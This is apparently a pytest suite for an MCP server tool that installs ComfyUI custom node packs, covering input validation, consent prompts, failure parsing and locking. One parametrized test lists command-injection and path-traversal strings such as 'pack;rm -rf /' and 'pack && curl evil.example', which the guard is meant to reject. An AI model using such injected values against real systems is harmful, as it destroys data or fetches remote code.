"""Tests for ``install_node`` — ``comfy node install <name...> --exit-on-fail``.

The engine owns the install itself (registry lookup, clone, dependency resolve).
These lock in what the WRAPPER owns, which is almost entirely about not running
third-party code by accident:

1. The input guard: a registry pack id is the whole accepted set. A git URL, a
   filesystem path, a leading dash, ``all``, or an oversized list is refused
   before any subprocess is spawned. The URL case is the load-bearing one — the
   consent prompt promises the user a NAMED PACK FROM THE REGISTRY, so a value
   that could be anything else would make the prompt lie about what it collected
   approval for.
2. The CONSENT posture, mirroring ``switch_comfyui_version``: on a client that can
   be prompted the USER is asked every call, ``confirm_install=True`` is not a way
   around that prompt, and a refusal is enforced here with no child spawned. Only
   a client that cannot be prompted falls back to the explicit argument, whose
   ``False`` default means a bare call installs nothing.
3. The VERDICT. ``--exit-on-fail`` is always forwarded — without it comfy-cli
   swallows a failed install outright — but it is not sufficient, because
   ComfyUI-Manager decides the outcome one layer below where the flag is read and
   prints its failure before consulting it. So a failed install can still exit 0,
   and the wrapper reads the engine's own printed verdict rather than its status:
   a pack the engine reported as failed never appears in ``installed``, and never
   comes back as ``ok: true``.
4. The shared ``_UPDATE_LOCK``: an install pip-installs into the same environment
   an update or a version switch does, so it is refused rather than queued.
5. The result contract, including ``restart_required: True`` — this tool never
   restarts anything, which is what lets a user say "install it, I'll restart the
   server myself".
6. The cm-cli PRE-FLIGHT, which is the second half of that consent posture: on an
   install whose ``cm_cli`` does not import — an absent ComfyUI-Manager, or one
   present only as a legacy clone under ``custom_nodes/`` — the call is refused
   BEFORE the prompt, because being asked to authorize third-party code that
   cannot be downloaded is worse than the failure it precedes. It fails OPEN, so
   an unreadable ``comfy env`` still installs and lets comfy-cli answer.
7. The async plumbing that posture required, mirroring ``test_update_consent``'s:
   the install keeps its OWN worker thread rather than asyncio's shared pool, it
   forwards the 30-minute timeout, and the lock it holds belongs to the SUBPROCESS
   rather than to the request. Without those three, replacing the done-callback
   release with a ``try/finally`` around the await passes every other test in this
   file while handing the lock to a retry that then runs a second concurrent pip.

comfy-cli is mocked throughout: no real ComfyUI and nothing is ever installed.
"""

from __future__ import annotations

import asyncio
import threading
from unittest import mock

import pytest
from conftest import envelope
from mcp.server.elicitation import (
    AcceptedElicitation,
    CancelledElicitation,
    DeclinedElicitation,
)

from comfy_mcp import server

# Captured before any test patches it, so the one test that wants the REAL
# `comfy env` pre-flight can put it back and drive the probe end to end through
# `patched_run`. Every other test runs with the stub the fixture below installs.
_REAL_WORKSPACE_REPORT = server._workspace_report


def _install(*args, **kwargs):
    """Drive the async ``install_node`` tool from a sync test."""
    return asyncio.run(server.install_node(*args, **kwargs))


def _env(**workspace):
    """A ``_workspace_report`` stand-in — the pre-flight's whole input."""
    return lambda: dict(workspace)


@pytest.fixture(autouse=True)
def manager_is_usable(monkeypatch):
    """Every test in this file runs on an install whose ``cm-cli`` works.

    `install_node` pre-flights `comfy env` before its prompt, so without this
    every test here would spawn a second child and read whatever the CLI fake was
    canned with. Stubbing the `comfy env` READ (rather than the classification
    that consumes it) keeps the real decision in the path — a test that expects an
    install to proceed is still asserting that a `venv-package` install is allowed
    to — while leaving `calls` to hold only the argv each test is actually about.

    Individual tests below re-patch `_workspace_report` to describe a different
    install; the last `setattr` wins, so overriding is just doing it again.
    """
    monkeypatch.setattr(
        server,
        "_workspace_report",
        _env(manager_mode="enable-gui", manager_detected="venv-package"),
    )


class _FakeSession:
    """Stand-in for the MCP ``ServerSession`` capability probe."""

    def __init__(self, supports_elicitation: bool):
        self._supports = supports_elicitation

    def check_client_capability(self, capability):
        return self._supports and capability.elicitation is not None


class _FakeCtx:
    """A fake MCPServer ``Context`` that answers the elicitation with ``action``.

    A local copy of the switch/spend tests' fake rather than a shared one,
    following the convention those files set: this gate's prompt must be
    assertable on its own, so a change to another gate's prompt cannot silently
    retune these tests.
    """

    def __init__(self, action="accept", approve=True, supports_elicitation=True):
        self.session = _FakeSession(supports_elicitation)
        self._action = action
        self._approve = approve
        self.elicitations: list[str] = []

    async def elicit(self, message, schema):
        self.elicitations.append(message)
        if self._action == "accept":
            return AcceptedElicitation(data=schema(approve=self._approve))
        if self._action == "decline":
            return DeclinedElicitation()
        return CancelledElicitation()


# --- the input guard --------------------------------------------------------


@pytest.mark.parametrize(
    "names",
    [
        [],  # nothing to install
        "comfyui-impact-pack",  # a bare string is not the list this takes
        None,
        [""],
        ["   "],
        [None],
        ["comfyui-impact-pack", ""],  # one bad entry poisons the call
    ],
)
def test_rejects_a_malformed_name_list_before_spawning(patched_plain_run, names):
    """A list this tool cannot vouch for never reaches argv — or the prompt."""
    calls = patched_plain_run(0, stderr="installed")
    ctx = _FakeCtx()

    with pytest.raises(server.ComfyCliError, match="invalid names"):
        _install(names, ctx=ctx)

    assert calls == []
    assert ctx.elicitations == []


@pytest.mark.parametrize(
    "name",
    [
        "-rf",  # argument injection: reads as an option, not a pack id
        "--exit-on-fail",
        "-",
        # A git URL or a path. Refused DELIBERATELY, and this is the guard's whole
        # reason for being stricter than the engine: the prompt says "from the
        # registry", so nothing that isn't a registry id may ride through it.
        "https://github.com/ltdrdata/ComfyUI-Impact-Pack",
        "git@github.com:ltdrdata/ComfyUI-Impact-Pack.git",
        "/tmp/evil-pack",
        "../../etc/passwd",
        "./local-pack",
        "pack;rm -rf /",
        "pack && curl evil.example",
        "pack|sh",
        "pack$(whoami)",
        "pack`whoami`",
        "pack with spaces",
        "pack\nsecond",
        "pack\0",
        ".leading-dot",  # must start alphanumeric
        "_leading-underscore",
    ],
)
def test_rejects_a_name_that_is_not_a_registry_id(patched_plain_run, name):
    """Only a registry slug is installable; everything else stops here."""
    calls = patched_plain_run(0, stderr="installed")
    ctx = _FakeCtx()

    with pytest.raises(server.ComfyCliError):
        _install([name], ctx=ctx)

    assert calls == []
    assert ctx.elicitations == []


def test_an_oversized_name_is_reported_by_length_not_echoed(patched_plain_run):
    """A megabyte-long "pack name" must not come back through the response."""
    patched_plain_run(0, stderr="installed")
    huge = "a" * 5000

    with pytest.raises(server.ComfyCliError) as excinfo:
        _install([huge], ctx=_FakeCtx())

    message = str(excinfo.value)
    assert "5000 characters" in message
    assert huge not in message


def test_an_oversized_invalid_name_is_still_reported_by_length(patched_plain_run):
    """The ordering the guard documents, pinned: length is checked before shape.

    The test above cannot see that ordering — ``"a" * 5000`` MATCHES the registry
    pattern, so it reaches the length error whichever check runs first. A value
    that is both oversized and malformed is the case that separates them: with the
    checks reversed it takes the id-shape branch, which echoes the value, and a
    5000-character echo is exactly what the length branch exists to avoid.
    """
    patched_plain_run(0, stderr="installed")
    junk = "/" * 5000

    with pytest.raises(server.ComfyCliError) as excinfo:
        _install([junk], ctx=_FakeCtx())

    message = str(excinfo.value)
    assert "5000 characters" in message
    assert "not a registry pack id" not in message  # took the length branch
    assert junk not in message
    assert "/" * 100 not in message  # nor any long slice of it


def test_a_batch_that_joins_too_long_is_refused(patched_plain_run):
    """The count cap and the per-id cap leave their PRODUCT unbounded.

    32 ids of 128 characters each is a legal list by both other bounds and a
    4,698-character confirmation prompt — the "scrolls past rather than reads"
    failure the count cap exists to prevent, reached by padding instead of by
    counting. Refused rather than shown truncated: the prompt naming every pack IS
    the consent, so a batch padded with look-alike slugs must not be able to hide
    the real pack past a truncation marker.
    """
    calls = patched_plain_run(0, stderr="installed")
    names = [f"pack-{n}-" + "x" * 120 for n in range(server._MAX_NODE_PACK_NAMES)]
    ctx = _FakeCtx()

    with pytest.raises(server.ComfyCliError) as excinfo:
        _install(names, ctx=ctx)

    message = str(excinfo.value)
    assert "smaller batches" in message
    assert str(server._MAX_NODE_PACK_NAMES_CHARS) in message
    assert calls == []
    assert ctx.elicitations == []  # nobody was asked to approve an unreadable list


def test_a_full_size_batch_of_real_looking_ids_still_installs(patched_plain_run):
    """The joined cap must not refuse a batch anyone would actually send.

    Registry slugs run ~15-30 characters, so a full 32-pack call of realistic ids
    lands under the bound; a cap that refused this would be the wrapper inventing
    a limitation rather than keeping its own prompt readable.
    """
    calls = patched_plain_run(0, stderr="installed")
    names = [f"comfyui-node-pack-{n:02d}" for n in range(server._MAX_NODE_PACK_NAMES)]

    result = _install(names, ctx=(ctx := _FakeCtx()))

    assert len(calls) == 1
    assert result["installed"] == names
    assert names[-1] in ctx.elicitations[0]  # every pack was named in the prompt


def test_too_many_packs_is_refused_so_the_prompt_stays_readable(patched_plain_run):
    """An approval the user cannot actually read is not an approval."""
    calls = patched_plain_run(0, stderr="installed")
    names = [f"pack-{n}" for n in range(server._MAX_NODE_PACK_NAMES + 1)]

    with pytest.raises(server.ComfyCliError, match="exceeds the"):
        _install(names, ctx=_FakeCtx())

    assert calls == []


def test_all_is_refused_and_points_at_update_comfyui(patched_plain_run):
    """`all` is a different intent, and comfy-cli's own refusal is opaque."""
    calls = patched_plain_run(0, stderr="installed")

    with pytest.raises(server.ComfyCliError) as excinfo:
        _install(["all"], ctx=_FakeCtx())

    assert 'update_comfyui(target="all")' in str(excinfo.value)
    assert calls == []


# --- what reaches argv ------------------------------------------------------


def test_approved_install_forwards_exit_on_fail(patched_plain_run):
    """`--exit-on-fail` is not optional: without it a failure exits 0."""
    calls = patched_plain_run(0, stderr="Installed comfyui-impact-pack")

    result = _install(["comfyui-impact-pack"], ctx=_FakeCtx())

    cmd = calls[0]["cmd"]
    assert cmd[1:4] == ["--json", "--where", "local"]  # global flags still first
    assert cmd[4:] == ["node", "install", "comfyui-impact-pack", "--exit-on-fail"]
    assert result["installed"] == ["comfyui-impact-pack"]
    assert result["restart_required"] is True


def test_multiple_packs_are_forwarded_in_order_then_the_flag(patched_plain_run):
    """Several packs in one call, with the flag after the positionals."""
    calls = patched_plain_run(0, stderr="done")

    _install(["comfyui-impact-pack", "comfyui_controlnet_aux"], ctx=_FakeCtx())

    assert calls[0]["cmd"][4:] == [
        "node",
        "install",
        "comfyui-impact-pack",
        "comfyui_controlnet_aux",
        "--exit-on-fail",
    ]


def test_names_are_stripped_before_reaching_argv(patched_plain_run):
    """Surrounding whitespace is normalized away, like `update_comfyui`'s target."""
    calls = patched_plain_run(0, stderr="done")

    result = _install(["  comfyui-impact-pack  "], ctx=_FakeCtx())

    assert calls[0]["cmd"][6] == "comfyui-impact-pack"
    assert result["installed"] == ["comfyui-impact-pack"]


def test_a_failed_install_still_raises(patched_plain_run):
    """The flag's whole point: a non-zero exit must reach the caller."""
    patched_plain_run(1, stderr="ERROR: pack not found in registry")

    with pytest.raises(server.ComfyCliError):
        _install(["no-such-pack"], ctx=_FakeCtx())


# --- the verdict comes from the OUTPUT, not the exit status -----------------
#
# `comfy node install` can print cm-cli's per-pack failure and still exit 0, so
# `--exit-on-fail` above is necessary but not sufficient. ComfyUI-Manager decides
# the outcome one layer below where the flag is read: `cm-cli.py`'s
# `for_each_nodes` swallows a per-pack exception, and its `install_node` prints
# the failure sentence BEFORE it consults `exit_on_fail`. These lock in that a
# pack the engine reported as failed never appears in `installed` and never comes
# back as `ok: true` — a false success is worse than a plain error, because
# nothing downstream has a reason to doubt it.

# cm-cli's real output for a pack id that is not in the registry channel: the
# failure sentence, then `install_by_id`'s `res.msg` on the next line.
_NOT_FOUND_OUTPUT = (
    "install_node exit on fail:True...\n"
    "[bold red]ERROR: An error occurred while installing 'no-such-pack-xyz'.\n"
    "Node 'no-such-pack-xyz@unknown' not found in [default, remote][/bold red]\n"
)


def test_a_failed_install_that_exits_zero_is_not_reported_as_success(
    patched_plain_run,
):
    """The reported bug: exit 0 + a printed failure used to return ok/installed."""
    patched_plain_run(0, stdout=_NOT_FOUND_OUTPUT)

    result = _install(["no-such-pack-xyz"], ctx=_FakeCtx())

    assert result["installed"] == []
    assert result["result"]["ok"] is False
    assert result["failed"] == [
        {
            "name": "no-such-pack-xyz",
            "code": "pack_not_found",
            "error": "Node 'no-such-pack-xyz@unknown' not found in [default, remote]",
        }
    ]
    # The structured signal an agent actually reads, not prose in `message`.
    assert "failed to install" in result["error"]
    # Nothing landed, so there is nothing for a restart to pick up — telling the
    # user to restart is exactly the bad advice the false success produced.
    assert result["restart_required"] is False


def test_a_partial_failure_reports_each_pack_separately(patched_plain_run):
    """`names` is a list, so a per-pack verdict is the whole point."""
    patched_plain_run(
        0,
        stdout=(
            "1/2 [INSTALLED] comfyui-impact-pack\n" + _NOT_FOUND_OUTPUT + "2/2 done\n"
        ),
    )

    result = _install(["comfyui-impact-pack", "no-such-pack-xyz"], ctx=_FakeCtx())

    assert result["installed"] == ["comfyui-impact-pack"]
    assert [entry["name"] for entry in result["failed"]] == ["no-such-pack-xyz"]
    # Something DID land, so the restart advice is still correct.
    assert result["restart_required"] is True


def test_a_failure_buried_before_a_megabyte_of_pip_output_is_still_seen(
    patched_plain_run,
):
    """The parse reads the UNCAPPED streams, not the 1000-char `message` tail.

    In a multi-pack install the pack that failed FIRST is pushed out of that tail
    by everything the later packs print — which is precisely the partial failure a
    caller most needs to be told about.
    """
    patched_plain_run(0, stdout=_NOT_FOUND_OUTPUT + ("Collecting torch\n" * 5000))

    result = _install(["no-such-pack-xyz"], ctx=_FakeCtx())

    assert "no-such-pack-xyz" not in result["result"]["message"]  # gone from the tail
    assert [entry["name"] for entry in result["failed"]] == ["no-such-pack-xyz"]


def test_a_non_registry_failure_gets_the_generic_code(patched_plain_run):
    """`pack_not_found` is claimed only for the message that means it.

    A clone or dependency failure is a different problem with a different remedy
    — a retry can work — so it must not be labelled with the code that says the id
    itself is wrong.
    """
    patched_plain_run(
        0,
        stdout=(
            "[bold red]ERROR: An error occurred while installing "
            "'comfyui-impact-pack'.\nFailed to clone repository[/bold red]\n"
        ),
    )

    result = _install(["comfyui-impact-pack"], ctx=_FakeCtx())

    assert result["failed"] == [
        {
            "name": "comfyui-impact-pack",
            "code": "install_failed",
            "error": "Failed to clone repository",
        }
    ]


def test_a_failure_naming_a_pack_we_did_not_ask_for_is_still_reported(
    patched_plain_run,
):
    """A dependency pack cm-cli named itself must not vanish, or drop ours.

    Reporting it without subtracting anything from `installed` is the
    one-directional choice: it can neither silently drop a pack the caller asked
    for nor silently swallow a failure.
    """
    patched_plain_run(
        0,
        stdout=(
            "1/1 [INSTALLED] comfyui-impact-pack\n"
            "[bold red]ERROR: An error occurred while installing 'some-dependency'."
            "\nNode 'some-dependency@unknown' not found in [default, remote]"
            "[/bold red]\n"
        ),
    )

    result = _install(["comfyui-impact-pack"], ctx=_FakeCtx())

    assert result["installed"] == ["comfyui-impact-pack"]
    assert [entry["name"] for entry in result["failed"]] == ["some-dependency"]


def test_a_wrapped_failure_sentence_is_still_matched(patched_plain_run):
    """rich wraps at the console width, so the sentence can span two lines.

    A pack id long enough to push the sentence past that width would otherwise
    put a newline between the words and defeat the match — the same folding
    `_normalize_cli_text` does for every other phrase this server reads.
    """
    patched_plain_run(
        0,
        stdout=(
            "[bold red]ERROR: An error occurred while\n"
            "installing 'a-very-long-pack-id-that-wrapped'.\n"
            "Node 'a-very-long-pack-id-that-wrapped@unknown' not found in "
            "[default, remote][/bold red]\n"
        ),
    )

    result = _install(["a-very-long-pack-id-that-wrapped"], ctx=_FakeCtx())

    assert result["installed"] == []
    assert result["failed"][0]["code"] == "pack_not_found"


def test_two_consecutive_failures_are_both_reported(patched_plain_run):
    """A second failure must not be swallowed by the first one's reason window.

    `finditer` resumes at the END of each match, so an untempered fixed-width
    window would consume the next failure sentence whole and report only one of
    the two — leaving the second pack inside `installed` with
    `restart_required: true`, the exact false success this parse removes.
    """
    patched_plain_run(
        0,
        stdout=(
            "[bold red]ERROR: An error occurred while installing 'pack-a-xyz'.\n"
            "Node 'pack-a-xyz@unknown' not found in [default, remote]\n"
            "ERROR: An error occurred while installing 'pack-b-xyz'.\n"
            "Failed to clone repository[/bold red]\n"
        ),
    )

    result = _install(["pack-a-xyz", "pack-b-xyz"], ctx=_FakeCtx())

    assert result["installed"] == []
    assert result["failed"] == [
        {
            "name": "pack-a-xyz",
            "code": "pack_not_found",
            "error": "Node 'pack-a-xyz@unknown' not found in [default, remote]",
        },
        {
            "name": "pack-b-xyz",
            "code": "install_failed",
            "error": "Failed to clone repository",
        },
    ]


def test_a_rendered_run_does_not_borrow_the_next_packs_message(patched_plain_run):
    """With markup RENDERED there is no literal `[/` to trim the window at.

    The reason window then runs on into whatever was printed next, so without the
    tempering a neighbouring pack's `Node '…' not found in` line would be read as
    this pack's — mislabelling a clone failure as `pack_not_found` ("retrying the
    same id will not help") and relaying the wrong pack's text as its `error`.
    """
    patched_plain_run(
        0,
        stdout=(
            "ERROR: An error occurred while installing 'pack-a-xyz'.\n"
            "Failed to clone repository\n"
            "ERROR: An error occurred while installing 'pack-b-xyz'.\n"
            "Node 'pack-b-xyz@unknown' not found in [default, remote]\n"
        ),
    )

    result = _install(["pack-a-xyz", "pack-b-xyz"], ctx=_FakeCtx())

    codes = {entry["name"]: entry["code"] for entry in result["failed"]}
    assert codes == {"pack-a-xyz": "install_failed", "pack-b-xyz": "pack_not_found"}
    assert result["failed"][0]["error"] == "Failed to clone repository"


def test_an_uncapturable_quoted_id_still_reports_the_failure(patched_plain_run):
    """A quoted value past the capture bound must not make the sentence unmatchable.

    The `'<pack>'` group is optional for exactly this: a required one would drop
    the failure entirely and leave `ok: True` — the failure mode this whole parse
    exists to remove — where an unnamed record still says something went wrong.
    """
    patched_plain_run(
        0,
        stdout=(
            "ERROR: An error occurred while installing '" + ("x" * 200) + "'.\n"
            "Failed to clone repository\n"
        ),
    )

    result = _install(["comfyui-impact-pack"], ctx=_FakeCtx())

    assert result["result"]["ok"] is False
    assert [entry["name"] for entry in result["failed"]] == [""]
    # Unattributed, so nothing is subtracted from what the caller asked for — and
    # the ratio counts the REQUESTED packs, not the records.
    assert result["installed"] == ["comfyui-impact-pack"]
    assert "0 of 1 requested pack(s) failed to install" in result["error"]
    assert "1 further failure(s)" in result["error"]


def test_the_sentence_still_has_to_name_something():
    """Uncapturable is not the same as absent: the opening quote stays required.

    Dropping it to catch the over-long id would make every prose line a pack's own
    pip log prints about "installing" a wheel flip an install to `ok: False`.
    """
    assert (
        server._extract_install_failures(
            "ERROR: An error occurred while installing the wheel for torch\n"
        )
        == []
    )


def test_the_same_failure_on_both_streams_is_reported_once(patched_plain_run):
    """rich writes to one stream and a pack's own log can echo it to the other."""
    patched_plain_run(0, stdout=_NOT_FOUND_OUTPUT, stderr=_NOT_FOUND_OUTPUT)

    result = _install(["no-such-pack-xyz"], ctx=_FakeCtx())

    assert len(result["result"]["failures"]) == 1
    assert [entry["name"] for entry in result["failed"]] == ["no-such-pack-xyz"]


def test_a_flood_on_one_stream_cannot_evict_the_real_failure(patched_plain_run):
    """The ceiling is spent on DISTINCT failures, and stdout goes in first.

    Capping the raw concatenation let a stream carrying `_MAX_INSTALL_FAILURES`
    copies of the sentence — a pack's own install log quoting it — push out every
    genuine record, and the packs the engine really rejected came back inside
    `installed`.
    """
    flood = "".join(
        f"ERROR: An error occurred while installing 'noise-{index}'.\n"
        "Failed to clone repository\n"
        for index in range(server._MAX_INSTALL_FAILURES * 2)
    )
    patched_plain_run(0, stdout=_NOT_FOUND_OUTPUT, stderr=flood)

    result = _install(["no-such-pack-xyz"], ctx=_FakeCtx())

    assert len(result["result"]["failures"]) == server._MAX_INSTALL_FAILURES
    assert result["installed"] == []
    assert result["failed"][0]["name"] == "no-such-pack-xyz"


def test_a_bracketed_path_in_the_reason_is_not_trimmed(patched_plain_run):
    """The trim is rich's closing TAG, not the first `[/` in cm-cli's message.

    A local channel is an absolute path, so the message this parse most wants to
    relay is also the one a bare `[/` test truncates.
    """
    patched_plain_run(
        0,
        stdout=(
            "[bold red]ERROR: An error occurred while installing 'no-such-pack-xyz'."
            "\nNode 'no-such-pack-xyz@unknown' not found in "
            "[/srv/comfy/channels/local, local][/bold red]\n"
        ),
    )

    result = _install(["no-such-pack-xyz"], ctx=_FakeCtx())

    assert result["failed"] == [
        {
            "name": "no-such-pack-xyz",
            "code": "pack_not_found",
            "error": (
                "Node 'no-such-pack-xyz@unknown' not found in "
                "[/srv/comfy/channels/local, local]"
            ),
        }
    ]


def test_an_id_rich_wrapped_mid_token_is_still_attributed(patched_plain_run):
    """The fold turns rich's break INSIDE a long id into a space.

    A registry id never carries whitespace of its own, so attribution compares
    with it removed — otherwise the pack the caller named stays in `installed`
    with `restart_required` true, which is the false success again.
    """
    patched_plain_run(
        0,
        stdout=(
            "[bold red]ERROR: An error occurred while installing 'a-very-long-pa\n"
            "ck-id-that-wrapped'.\nFailed to clone repository[/bold red]\n"
        ),
    )

    result = _install(["a-very-long-pack-id-that-wrapped"], ctx=_FakeCtx())

    assert result["installed"] == []
    assert result["restart_required"] is False
    # Reported under the caller's own spelling, not the wrapped one.
    assert result["failed"][0]["name"] == "a-very-long-pack-id-that-wrapped"


def test_a_credential_in_a_relayed_failure_is_masked(patched_plain_run):
    """cm-cli quotes the repo URL it tried, and a private channel carries auth."""
    patched_plain_run(
        0,
        stdout=(
            "[bold red]ERROR: An error occurred while installing 'private-pack'.\n"
            "Failed to clone https://<user>:<pass>@example.invalid/private-pack.git"
            "[/bold red]\n"
        ),
    )

    result = _install(["private-pack"], ctx=_FakeCtx())

    error = result["failed"][0]["error"]
    assert "<pass>" not in error
    assert "example.invalid" in error  # the useful half survives


def test_a_clean_install_keeps_the_original_payload(patched_plain_run):
    """No failure sentence -> nothing changes, including the absent `failed` key."""
    patched_plain_run(0, stdout="1/1 [INSTALLED] comfyui-impact-pack\n")

    result = _install(["comfyui-impact-pack"], ctx=_FakeCtx())

    assert result["installed"] == ["comfyui-impact-pack"]
    assert result["restart_required"] is True
    assert result["result"]["ok"] is True
    assert "failed" not in result
    assert "error" not in result


@pytest.mark.parametrize(
    "failures",
    [
        ["a bare string, not a record"],  # a shape this wrapper never writes
        [],  # present but empty
        "not a list at all",
    ],
)
def test_an_unreadable_failures_field_degrades_to_the_success_payload(failures):
    """The day comfy-cli grows a real envelope, `result` is the ENGINE's data.

    A `failures` key in it would then be whatever shape the engine chose, so every
    field is checked rather than assumed: an `AttributeError` here would turn a
    reportable install into an unhandled internal error, and emitting "0 of 1
    pack(s) failed" alongside an empty list would be a worse lie than the one this
    replaced.
    """
    result = server._classify_install_result(
        ["comfyui-impact-pack"], {"ok": True, "failures": failures}
    )

    assert result["installed"] == ["comfyui-impact-pack"]
    assert result["restart_required"] is True
    assert "failed" not in result


def test_a_record_with_unusable_fields_still_counts_as_a_failure():
    """Unnamed is not the same as absent, and must not read as success.

    A record whose fields did not survive still says something failed, so it is
    reported (with an empty name) rather than dropped — the same one-directional
    choice the extractor makes when cm-cli's sentence carried no usable name.
    """
    result = server._classify_install_result(
        ["comfyui-impact-pack"],
        {"ok": False, "failures": [{"pack": 7, "reason": None}]},
    )

    assert result["failed"] == [{"name": "", "code": "install_failed", "error": ""}]
    # Nothing was attributed to the requested pack, so it is not subtracted.
    assert result["installed"] == ["comfyui-impact-pack"]


def test_another_plain_verb_is_never_flipped_by_the_same_sentence(patched_plain_run):
    """The scan is scoped to `node install`, not to every no-envelope verb.

    A custom node's own output can quote anything, and `launch` relays all of it —
    so a nested pack printing this sentence must not turn a successful launch into
    a failure.
    """
    calls = patched_plain_run(
        0, stderr="ERROR: An error occurred while installing 'something'."
    )

    result = asyncio.run(server.launch_comfyui())

    assert calls[0]["cmd"][4] == "launch"
    assert result["ok"] is True
    assert "failures" not in result


# --- consent: a client that CAN be prompted ---------------------------------


def test_approved_install_runs_and_the_prompt_named_the_stakes(patched_plain_run):
    """Accept -> the install runs, and the user was told what it does."""
    calls = patched_plain_run(0, stderr="done")

    result = _install(
        ["comfyui-impact-pack"], ctx=(ctx := _FakeCtx(action="accept", approve=True))
    )

    assert len(ctx.elicitations) == 1
    prompt = ctx.elicitations[0]
    assert "comfyui-impact-pack" in prompt
    assert "DOWNLOADS" in prompt  # third-party code arrives
    assert "RUNS" in prompt  # and is executed
    assert "restarted" in prompt  # and won't be visible until then
    assert len(calls) == 1
    assert result["restart_required"] is True


@pytest.mark.parametrize(
    ("action", "approve"),
    [
        ("decline", False),  # said no
        ("cancel", False),  # dismissed the prompt
        ("accept", False),  # accepted without actually answering yes
    ],
)
def test_a_refusal_spawns_no_child(patched_plain_run, action, approve):
    """A refusal is enforced HERE — comfy-cli is never started, nothing installed."""
    calls = patched_plain_run(0, stderr="done")
    ctx = _FakeCtx(action=action, approve=approve)

    with pytest.raises(server.ComfyCliError, match="node install not confirmed"):
        _install(["comfyui-impact-pack"], ctx=ctx)

    assert calls == []


def test_confirm_install_is_not_a_way_around_the_prompt(patched_plain_run):
    """An agent setting `confirm_install=True` itself does not authorize the run.

    The hole this closes is the spend gates': a host's blanket "always allow this
    tool" toggle lets an agent set the argument for itself, which would otherwise
    be standing authority to execute third-party code on the user's machine — and
    the pack names are frequently the model's own guess.
    """
    calls = patched_plain_run(0, stderr="done")
    ctx = _FakeCtx(action="decline")

    with pytest.raises(server.ComfyCliError, match="node install not confirmed"):
        _install(["comfyui-impact-pack"], confirm_install=True, ctx=ctx)

    assert len(ctx.elicitations) == 1  # asked anyway
    assert calls == []


def test_the_prompt_is_raised_even_when_confirm_install_is_true(patched_plain_run):
    """The approving case of the rule above: asked, then run."""
    calls = patched_plain_run(0, stderr="done")
    ctx = _FakeCtx(action="accept", approve=True)

    _install(["comfyui-impact-pack"], confirm_install=True, ctx=ctx)

    assert len(ctx.elicitations) == 1
    assert len(calls) == 1


def test_an_unknown_capability_still_asks(patched_plain_run):
    """A probe that ERRORS is "could not tell", never "cannot elicit"."""

    class _BrokenSession:
        def check_client_capability(self, capability):
            raise RuntimeError("probe exploded")

    calls = patched_plain_run(0, stderr="done")
    ctx = _FakeCtx(action="decline")
    ctx.session = _BrokenSession()

    with pytest.raises(server.ComfyCliError, match="node install not confirmed"):
        _install(["comfyui-impact-pack"], confirm_install=True, ctx=ctx)

    assert len(ctx.elicitations) == 1
    assert calls == []


def test_an_unanswered_prompt_is_a_refusal(patched_plain_run, monkeypatch):
    """A prompt left hanging past the timeout installs nothing."""
    calls = patched_plain_run(0, stderr="done")
    monkeypatch.setattr(server, "_ELICIT_TIMEOUT", 0.05)

    class _HangingCtx(_FakeCtx):
        async def elicit(self, message, schema):
            self.elicitations.append(message)
            await asyncio.sleep(10)

    ctx = _HangingCtx()

    with pytest.raises(server.ComfyCliError, match="node install not confirmed"):
        _install(["comfyui-impact-pack"], ctx=ctx)

    assert calls == []


def test_a_client_that_errors_on_the_prompt_is_a_refusal(patched_plain_run):
    """A broken elicit() fails closed, and names the terminal escape hatch."""
    calls = patched_plain_run(0, stderr="done")

    class _ExplodingCtx(_FakeCtx):
        async def elicit(self, message, schema):
            raise RuntimeError("client went away")

    with pytest.raises(server.ComfyCliError) as excinfo:
        _install(["comfyui-impact-pack"], ctx=_ExplodingCtx())

    message = str(excinfo.value)
    assert "Nothing was installed." in message
    assert "comfy node install" in message  # the way out
    assert calls == []


# --- consent: a client that CANNOT be prompted ------------------------------


@pytest.mark.parametrize(
    "make_ctx",
    [
        lambda: None,  # no context at all (a direct call, or a host injecting none)
        lambda: _FakeCtx(supports_elicitation=False),
    ],
)
def test_an_unpromptable_client_installs_nothing_by_default(
    patched_plain_run, make_ctx
):
    """The `False` default is what makes a bare call from such a client safe."""
    calls = patched_plain_run(0, stderr="done")

    with pytest.raises(server.ComfyCliError, match="node install not confirmed"):
        _install(["comfyui-impact-pack"], ctx=make_ctx())

    assert calls == []


def test_an_unpromptable_client_may_pass_the_explicit_flag(patched_plain_run):
    """With no prompt available, the argument is the documented consent route."""
    calls = patched_plain_run(0, stderr="done")
    ctx = _FakeCtx(supports_elicitation=False)

    result = _install(["comfyui-impact-pack"], confirm_install=True, ctx=ctx)

    assert ctx.elicitations == []  # there was nothing to ask
    assert calls[0]["cmd"][4:] == [
        "node",
        "install",
        "comfyui-impact-pack",
        "--exit-on-fail",
    ]
    assert result["restart_required"] is True


def test_the_unpromptable_refusal_states_the_stakes(patched_plain_run):
    """An agent reading the error has to learn what it would be authorizing."""
    patched_plain_run(0, stderr="done")

    with pytest.raises(server.ComfyCliError) as excinfo:
        _install(["comfyui-impact-pack"], ctx=None)

    message = str(excinfo.value)
    assert "confirm_install=True" in message
    assert "third-party code" in message
    assert "never just to clear this error" in message


# --- the shared update lock -------------------------------------------------


def test_an_in_flight_update_refuses_before_the_prompt(patched_plain_run):
    """Refused, not queued — and without asking the user to approve a dead end.

    The peek runs before consent so a caller does not answer a prompt for an
    install that was never going to start.
    """
    calls = patched_plain_run(0, stderr="done")
    ctx = _FakeCtx()

    assert server._UPDATE_LOCK.acquire(blocking=False)
    try:
        with pytest.raises(server.ComfyCliError, match="already running"):
            _install(["comfyui-impact-pack"], ctx=ctx)
    finally:
        server._UPDATE_LOCK.release()

    assert ctx.elicitations == []
    assert calls == []


def test_the_lock_is_released_after_a_successful_install(patched_plain_run):
    """A leaked lock would wedge every later update, switch and install."""
    patched_plain_run(0, stderr="done")

    _install(["comfyui-impact-pack"], ctx=_FakeCtx())

    assert server._UPDATE_LOCK.acquire(blocking=False)
    server._UPDATE_LOCK.release()


def test_the_lock_is_released_after_a_failed_install(patched_plain_run):
    """Same, on the failure path."""
    patched_plain_run(1, stderr="boom")

    with pytest.raises(server.ComfyCliError):
        _install(["comfyui-impact-pack"], ctx=_FakeCtx())

    assert server._UPDATE_LOCK.acquire(blocking=False)
    server._UPDATE_LOCK.release()


def test_a_refused_install_never_took_the_lock(patched_plain_run):
    """A declined call must not block an update that is legitimately in flight."""
    patched_plain_run(0, stderr="done")

    with pytest.raises(server.ComfyCliError, match="node install not confirmed"):
        _install(["comfyui-impact-pack"], ctx=_FakeCtx(action="decline"))

    assert server._UPDATE_LOCK.acquire(blocking=False)
    server._UPDATE_LOCK.release()


